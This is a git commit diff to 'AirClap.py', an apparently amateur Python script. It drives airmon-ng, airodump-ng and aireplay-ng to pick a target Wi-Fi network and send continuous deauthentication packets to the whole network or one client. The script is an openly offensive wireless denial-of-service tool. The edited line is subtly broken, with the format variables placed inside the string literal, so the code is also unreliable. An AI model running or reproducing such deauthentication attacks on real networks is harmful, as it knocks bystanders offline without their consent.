111d0775d451a3885cb470f2dd21879ab81a0745
jobro247 <44535515+jobro247@users.noreply.github.com>
2018-11-21 22:30:51 -0800

    Update AirClap.py

--- AirClap.py
+++ AirClap.py
@@ -8,7 +8,7 @@ os.system("airmon-ng start wlan0")
 os.system("airodump-ng wlan0mon")
 x = raw_input("Enter the bssid that you want to CLAP!:")
 e = raw_input("Enter the channel of the network you wanna CLAP!:")
-os.system("airodump-ng --channel %s --bssid %s wlan0mon" e, x)
+os.system("airodump-ng --channel %s --bssid %s wlan0mon e, x")
 aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
 if aireplay == 'Network':
   command = "aireplay-ng -0 0 -a %s wlan0mon"
